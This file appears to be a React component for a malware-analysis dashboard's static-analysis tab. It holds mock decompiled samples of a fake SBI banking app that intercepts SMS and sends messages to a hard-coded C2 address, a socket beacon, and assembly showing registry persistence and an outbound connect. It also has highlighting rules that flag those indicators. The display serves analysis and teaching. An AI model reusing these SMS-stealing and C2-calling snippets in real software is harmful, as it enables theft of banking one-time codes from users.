import * as React from "react";
import { Copy, Check, Search, FileCode, Shield, Server, Info, Hash } from "lucide-react";
import { ThreatCase } from "./types";

interface StaticAnalysisTabProps {
  activeCase: ThreatCase;
}

export function StaticAnalysisTab({ activeCase }: StaticAnalysisTabProps) {
  const [selectedFile, setSelectedFile] = React.useState<string>(activeCase.type === "APK" ? "AndroidManifest.xml" : "MainEntry.asm");
  const [copied, setCopied] = React.useState(false);
  const [searchQuery, setSearchQuery] = React.useState("");
  const [activeSubTab, setActiveSubTab] = React.useState<"code" | "permissions" | "entropy" | "metadata">("code");

  // Virtual file system contents
  const apkFiles = {
    "AndroidManifest.xml": `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.secure.token.sbi">
    <uses-permission android:name="android.permission.RECEIVE_SMS" android:priority="999" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    
    <application android:label="SBI Token Secure" android:theme="@android:style/Theme.NoDisplay">
        <receiver android:name=".SMSInterceptor" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>
        <service android:name=".StealthSocketService" android:enabled="true" />
    </application>
</manifest>`,
    "SMSInterceptor.java": `package com.secure.token.sbi;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSInterceptor extends BroadcastReceiver {
    private static final String STEALTH_C2 = "185.220.101.5";

    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
            String text = msg.getMessageBody();
            String address = msg.getOriginatingAddress();
            
            // Forward secret credentials to socket server
            HttpStealthPost.dispatch(STEALTH_C2, address, text);
        }
    }
}`,
    "StealthSocketService.java": `package com.secure.token.sbi;

import android.app.Service;
import java.io.OutputStream;
import java.net.Socket;

public class StealthSocketService extends Service {
    private Socket socket;
    
    public void initiateTunnel() {
        try {
            this.socket = new Socket("185.220.101.5", 4444);
            OutputStream out = socket.getOutputStream();
            out.write("INITIAL_HANDSHAKE_SBI_STEALER".getBytes());
        } catch (Exception e) {
            Log.e("BYPASS", "Tunnel failed, retrying on backup port...");
        }
    }
}`
  };

  const peFiles = {
    "MainEntry.asm": `; =========================================================
; Portable Executable Assembly Detonation Disassembly
; Cryptographic Hash: ${activeCase.hash.substring(0, 32)}
; =========================================================

section .text
global _start

_start:
    push    ebp
    mov     ebp, esp
    sub     esp, 40h                    ; Reserve shadow space
    
    ; VirtualAlloc to allocate process memory hollowing space
    push    40h                         ; PAGE_EXECUTE_READWRITE
    push    1000h                       ; MEM_COMMIT
    push    2000h                       ; Size: 8192 bytes
    push    0                           ; NULL
    call    [VirtualAlloc]              ; Resolve process block
    
    ; Registry write for system autostart persistence
    push    reg_path
    push    80000002h                   ; HKEY_LOCAL_MACHINE
    call    [RegOpenKeyExA]             
    
    push    payload_ptr
    push    reg_value
    push    1                           ; REG_SZ
    push    0
    push    sub_key
    push    eax
    call    [RegSetValueExA]            ; Force autostart hook
    
    ; Establish raw TCP socket stream
    push    6                           ; IPPROTO_TCP
    push    1                           ; SOCK_STREAM
    push    2                           ; AF_INET
    call    [socket]
    
    push    c2_ip                       ; 185.220.101.5
    push    eax
    call    [connect]                   ; Trigger outbound payload
    
    leave
    ret`,
    "Headers.txt": `IMAGE_DOS_HEADER:
    Magic: MZ (0x5A4D)
    PE Header Offset: 248 bytes
    
IMAGE_FILE_HEADER:
    Machine: AMD64 (x64 Architecture)
    Number of Sections: 5 (.text, .rdata, .data, .pdata, .rsrc)
    Size of Optional Header: 240 bytes
    Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    
IMAGE_SECTION_HEADER (.rsrc):
    Virtual Size: 0x2A1C
    Raw Data Offset: 0x4800
    Entropy Rating: 7.95 (Highly randomized, indicative of packing)
    Characteristics: INITIALIZED_DATA | READABLE`
  };

  const currentFiles: Record<string, string> = activeCase.type === "APK" ? apkFiles : peFiles;
  const currentContent = currentFiles[selectedFile] || "";

  // Filter lines based on search query
  const lines = currentContent.split("\n");
  const filteredLines = lines.map((line, idx) => ({ text: line, num: idx + 1 }));

  const handleCopy = () => {
    navigator.clipboard.writeText(currentContent);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6">
      
      {/* Tab select bar */}
      <div className="flex border-b border-[#222222]/80 gap-6">
        {[
          { id: "code", label: "Decompiled Disassembly", icon: FileCode },
          { id: "permissions", label: activeCase.type === "APK" ? "Permissions Manifest" : "Import Address Table", icon: Shield },
          { id: "entropy", label: "Entropy Spectrum", icon: Server },
          { id: "metadata", label: "Cryptographic Metadata", icon: Info }
        ].map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveSubTab(tab.id as any)}
              className={`pb-2.5 text-xs font-semibold uppercase tracking-wider flex items-center gap-2 border-b-2 transition-all ${
                activeSubTab === tab.id
                  ? "border-[#16ff4d] text-white"
                  : "border-transparent text-[#A0A0A0] hover:text-white"
              }`}
            >
              <Icon className="w-3.5 h-3.5" />
              {tab.label}
            </button>
          );
        })}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Code tab */}
        {activeSubTab === "code" && (
          <>
            {/* Left file structure list */}
            <div className="lg:col-span-3 space-y-3 shrink-0">
              <span className="text-[10px] font-mono text-[#6F6F6F] uppercase tracking-widest block">
                ARTEFACT COMPONENT INDEX
              </span>
              <div className="bg-[#111111] border border-[#222222] rounded-lg p-2.5 space-y-1">
                {Object.keys(currentFiles).map((file) => (
                  <button
                    key={file}
                    onClick={() => {
                      setSelectedFile(file);
                      setSearchQuery("");
                    }}
                    className={`w-full text-left font-mono text-[11px] px-3 py-2 rounded transition-colors flex items-center justify-between ${
                      selectedFile === file
                        ? "bg-[#16ff4d]/10 text-[#16ff4d] border border-[#16ff4d]/20"
                        : "text-[#A0A0A0] hover:bg-[#171717] hover:text-white"
                    }`}
                  >
                    <span className="truncate">{file}</span>
                    <FileCode className="w-3.5 h-3.5" />
                  </button>
                ))}
              </div>
            </div>

            {/* Right code editor block */}
            <div className="lg:col-span-9 bg-[#111111] border border-[#222222] rounded-lg flex flex-col overflow-hidden shadow-lg">
              
              {/* Controls bar */}
              <div className="px-4 py-3 bg-[#171717] border-b border-[#222222] flex items-center justify-between gap-4">
                <div className="relative flex-1 max-w-sm">
                  <Search className="w-3.5 h-3.5 text-[#6F6F6F] absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search variables, methods, IP endpoints..."
                    className="w-full bg-[#111111] border border-[#222222] rounded font-mono text-[11px] pl-9 pr-3 py-1.5 text-white focus:outline-none focus:border-[#16ff4d] placeholder:text-[#6F6F6F]"
                  />
                </div>
                <button
                  onClick={handleCopy}
                  className="bg-[#111111] hover:bg-[#171717] border border-[#222222] text-[10px] font-mono font-bold uppercase tracking-wide px-3 py-1.5 rounded text-white flex items-center gap-1.5 transition-all active:scale-95"
                >
                  {copied ? <Check className="w-3.5 h-3.5 text-[#16ff4d]" /> : <Copy className="w-3.5 h-3.5" />}
                  {copied ? "Copied" : "Copy Payload"}
                </button>
              </div>

              {/* Monospace Code Screen with syntax token highlighting */}
              <div className="p-4 font-mono text-[11px] bg-[#090909] overflow-y-auto max-h-[380px] leading-relaxed select-text select-all">
                {filteredLines.map((line) => {
                  const isMatch = searchQuery && line.text.toLowerCase().includes(searchQuery.toLowerCase());
                  
                  // Simple high-fidelity tokenizer styling
                  let processedText = line.text;
                  const isComment = processedText.trim().startsWith("//") || processedText.trim().startsWith(";");
                  const isImport = processedText.includes("import ") || processedText.includes("package ");
                  const isBanned = processedText.includes("185.220.101.5") || processedText.includes("VirtualAlloc") || processedText.includes("RegSetValueExA");

                  return (
                    <div 
                      key={line.num} 
                      className={`flex hover:bg-[#111111] px-2 rounded -mx-2 ${isMatch ? "bg-yellow-950/40 border-l-2 border-yellow-500" : ""}`}
                    >
                      <span className="w-8 select-none text-[#6F6F6F] text-right pr-4 shrink-0 font-mono text-[10px]">
                        {line.num}
                      </span>
                      <pre className={`flex-1 overflow-x-auto whitespace-pre font-mono ${
                        isComment ? "text-[#6F6F6F] italic" :
                        isImport ? "text-[#00c2ff]" :
                        isBanned ? "text-[#ff4040] font-bold" :
                        "text-[#A0A0A0]"
                      }`}>
                        {processedText}
                      </pre>
                    </div>
                  );
                })}
              </div>
            </div>
          </>
        )}

        {/* Permissions Audit tab */}
        {activeSubTab === "permissions" && (
          <div className="lg:col-span-12 bg-[#111111] border border-[#222222] rounded-lg p-6 space-y-4 shadow-md">
            <h3 className="text-sm font-bold text-white uppercase tracking-wider font-sans">
              {activeCase.type === "APK" ? "Android Application Security Policy Audit" : "Windows Import Address Table (IAT) Integrity Desk"}
            </h3>
            
            {activeCase.type === "APK" ? (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-[10px]">
                {[
                  { p: "android.permission.RECEIVE_SMS", status: "CRITICAL HOOK", desc: "Allows receiver payload to monitor and intercept incoming cellular SMS matrices.", active: true },
                  { p: "android.permission.READ_SMS", status: "CRITICAL HOOK", desc: "Allows binary to read existing user inbox buffers and steal secret credentials.", active: true },
                  { p: "android.permission.INTERNET", status: "ELEVATED PROFILE", desc: "Establishes raw TCP channel capability to dispatch stolen local variables to C2 sockets.", active: true },
                  { p: "android.permission.READ_CONTACTS", status: "MEDIUM RISK", desc: "Allows scraping of user contact list configurations for secondary campaign targets.", active: true },
                  { p: "android.permission.SYSTEM_ALERT_WINDOW", status: "CRITICAL HOOK", desc: "Required to overlay fraudulent phishing frames to steal login credentials.", active: true }
                ].map((perm) => (
                  <div key={perm.p} className="p-3.5 bg-[#090909] border border-[#222222] rounded-lg space-y-1.5">
                    <div className="flex justify-between items-center">
                      <span className="font-bold text-[#00c2ff]">{perm.p}</span>
                      <span className="px-2 py-0.5 rounded font-mono text-[8px] bg-red-950/40 text-[#ff4040] border border-red-500/20">
                        {perm.status}
                      </span>
                    </div>
                    <p className="text-[#A0A0A0] font-sans leading-relaxed text-[11px]">
                      {perm.desc}
                    </p>
                  </div>
                ))}
              </div>
            ) : (
              <div className="space-y-3 font-mono text-[11px]">
                <p className="text-[#A0A0A0] font-sans text-xs">
                  The IAT resolves dynamic system DLL links. Threat actors inject modules or hijack standard libraries to perform API hooking and process hollowing.
                </p>
                <div className="bg-[#090909] border border-[#222222] rounded overflow-hidden">
                  <table className="w-full text-left font-mono">
                    <thead>
                      <tr className="bg-[#171717] text-[#6F6F6F] text-[9px] uppercase tracking-wider border-b border-[#222222]">
                        <th className="p-3">API SYSTEM LIBRARY</th>
                        <th className="p-3">RESOLVED FUNCTION POINTER</th>
                        <th className="p-3">DETECTION CLASS</th>
                        <th className="p-3">RISK STATE</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-[#222222]/60 text-[#A0A0A0]">
                      {[
                        { dll: "KERNEL32.dll", func: "VirtualAlloc", cls: "Memory Management Bypass", state: "CRITICAL PROCESS HOLLOWING" },
                        { dll: "KERNEL32.dll", func: "WriteProcessMemory", cls: "Dynamic Payload Mutation", state: "CRITICAL MUTATION" },
                        { dll: "KERNEL32.dll", func: "CreateRemoteThread", cls: "Process Thread Forking", state: "HIGH THREAT TRIGGER" },
                        { dll: "ADVAPI32.dll", func: "RegSetValueExA", cls: "Startup Boot Mutation", state: "PERSISTENCE ANOMALY" },
                        { dll: "WS2_32.dll", func: "connect", cls: "Raw Outbound Transmission", state: "C2 ENDPOINT ATTEMPT" }
                      ].map((item, idx) => (
                        <tr key={idx} className="hover:bg-[#111111]/80">
                          <td className="p-3 text-white font-bold">{item.dll}</td>
                          <td className="p-3 text-[#00c2ff]">{item.func}</td>
                          <td className="p-3">{item.cls}</td>
                          <td className="p-3 font-bold text-[#ff4040]">{item.state}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Entropy Spectrum tab */}
        {activeSubTab === "entropy" && (
          <div className="lg:col-span-12 bg-[#111111] border border-[#222222] rounded-lg p-6 space-y-4">
            <h3 className="text-sm font-bold text-white uppercase tracking-wider font-sans">
              Binary Section Entropy Spectrogram (Evasion Detection)
            </h3>
            <p className="text-xs text-[#A0A0A0] leading-relaxed font-sans max-w-2xl">
              High entropy rating (7.5 - 8.0 H) indicates highly randomized data distribution. Packer software and encrypted payloads generate high entropy, bypassing standard file system signature detectors.
            </p>
            
            <div className="space-y-4 font-mono text-[11px] pt-2">
              {[
                { name: ".text (Executable Machine Directives)", entropy: 6.2, state: "NORMAL EXEC STATE" },
                { name: ".rdata (Read-only configurations)", entropy: 5.4, state: "NORMAL DATA" },
                { name: ".data (Dynamic Global Registrations)", entropy: 4.1, state: "NORMAL MUTABLE" },
                { name: ".rsrc (Resource Envelope / Payload)", entropy: 7.95, state: "ENCRYPTED / PACKED PAYLOAD TRIGGER" }
              ].map((sec) => (
                <div key={sec.name} className="p-4 bg-[#090909] border border-[#222222] rounded-lg">
                  <div className="flex justify-between text-white text-xs mb-1.5">
                    <span className="font-bold">{sec.name}</span>
                    <span className={sec.entropy > 7.5 ? "text-[#ff4040]" : "text-[#16ff4d]"}>{sec.entropy} H / 8.0</span>
                  </div>
                  <div className="w-full bg-[#171717] rounded-full h-2 overflow-hidden border border-[#222222]">
                    <div 
                      className={`h-full rounded-full transition-all duration-1000 ${sec.entropy > 7.5 ? "bg-[#ff4040]" : "bg-[#16ff4d]"}`}
                      style={{ width: `${(sec.entropy / 8) * 100}%` }}
                    />
                  </div>
                  <span className={`text-[9px] font-mono font-bold block mt-2 ${sec.entropy > 7.5 ? "text-[#ff4040]" : "text-[#6F6F6F]"}`}>
                    {sec.state}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Cryptographic Metadata tab */}
        {activeSubTab === "metadata" && (
          <div className="lg:col-span-12 bg-[#111111] border border-[#222222] rounded-lg p-6 space-y-4 shadow-md font-mono text-xs">
            <h3 className="text-sm font-bold text-white uppercase tracking-wider font-sans">
              Cryptographic Metadata & Certificate Ledger
            </h3>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="bg-[#090909] border border-[#222222] p-4 rounded-lg space-y-2">
                <span className="text-[10px] text-[#6F6F6F] uppercase tracking-widest block font-bold">
                  HASH REGISTER TRACE
                </span>
                <div className="space-y-1.5 font-mono text-[10px] text-[#A0A0A0]">
                  <p className="truncate"><span className="text-white font-bold">MD5:</span> {activeCase.hash.substring(0, 32)}</p>
                  <p className="truncate"><span className="text-white font-bold">SHA-1:</span> {activeCase.hash.substring(10, 50)}</p>
                  <p className="truncate"><span className="text-white font-bold">SHA-256:</span> {activeCase.hash}</p>
                  <p><span className="text-white font-bold">BYTES SIZE:</span> {activeCase.size}</p>
                </div>
              </div>

              <div className="bg-[#090909] border border-[#222222] p-4 rounded-lg space-y-2">
                <span className="text-[10px] text-[#6F6F6F] uppercase tracking-widest block font-bold">
                  AUTHOR SIGNATURE CERTIFICATE
                </span>
                <div className="space-y-1.5 font-mono text-[10px] text-[#A0A0A0]">
                  <p><span className="text-white font-bold">ISSUER:</span> CN=SecurePacker Enterprise, OU=Threat Division, O=Global</p>
                  <p><span className="text-white font-bold">SIGNATURE STATUS:</span> <span className="text-[#ff4040] font-bold">REVOKED / UNTRUSTED REPO</span></p>
                  <p><span className="text-white font-bold">COMPILED CLOCK:</span> {activeCase.date} UTC</p>
                  <p><span className="text-white font-bold">ENCLAVE DEPLOY:</span> SEC-OPS APPROVED BY NODE 4</p>
                </div>
              </div>
            </div>
          </div>
        )}

      </div>

    </div>
  );
}
